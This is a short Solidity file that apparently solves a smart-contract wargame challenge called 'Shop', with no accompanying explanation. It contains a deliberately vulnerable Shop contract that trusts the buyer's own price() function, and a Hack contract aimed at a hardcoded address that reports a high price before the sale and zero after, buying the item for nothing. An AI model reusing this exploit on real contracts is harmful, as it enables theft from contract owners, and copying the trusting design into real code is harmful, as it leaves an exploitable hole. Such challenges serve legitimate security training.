// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract Hack {
    address target = 0x3611142DfDa1b1fB974DC08A81cA2C99e666c87E;
    Shop shop = Shop(target);
    function price() external view returns (uint256) {
        if(shop.isSold() == true)
            return 0;
        return 114514;
    }
    function attack() public {
        shop.buy();
    }
}